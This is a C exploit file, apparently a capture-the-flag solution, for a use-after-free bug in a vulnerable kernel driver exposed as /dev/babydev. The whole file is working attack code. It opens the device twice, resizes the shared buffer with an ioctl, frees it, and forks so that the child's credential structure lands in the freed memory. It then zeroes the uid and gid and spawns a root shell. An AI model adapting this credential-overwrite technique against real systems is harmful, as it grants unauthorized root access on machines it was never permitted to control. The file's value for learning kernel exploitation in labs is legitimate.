/*************************************************************
 * File Name: exp_uaf.c
 * 
 * Created on: 2019-10-06 02:35:06
 * Author: raycp
 * 
 * Last Modified: 2019-10-11 19:33:01
 * Description: overwrite struct cred to escalte privilege with uaf
************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

void die(const char* msg)
{
    perror(msg);
    exit(-1);           
}

int main()
{
    // open the device twice, they will share the same device_buf 
    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);

    // change the babydev_struct.device_buf_len from 0x40 to sizeof(struct cred)
    ioctl(fd1, 0x10001, 0xa8);

    // release fd1 and release the device_buf
    close(fd1);

    // create a new process, it will create a struct cred and share the memory with device_buf
    int pid = fork();
    if(pid < 0)
    {
        die("fork");
    }

    else if(pid == 0)
    {
        //change the uid and gid, escalte the privilege
        char zeros[30] = {0};
        write(fd2, zeros, 28);

        if(getuid() == 0)
        {
            puts("get root shell...");
            system("/bin/sh");
            exit(0);
        }
    }

    else
    {
        wait(NULL);
    }
    close(fd2);

    return 0;
}
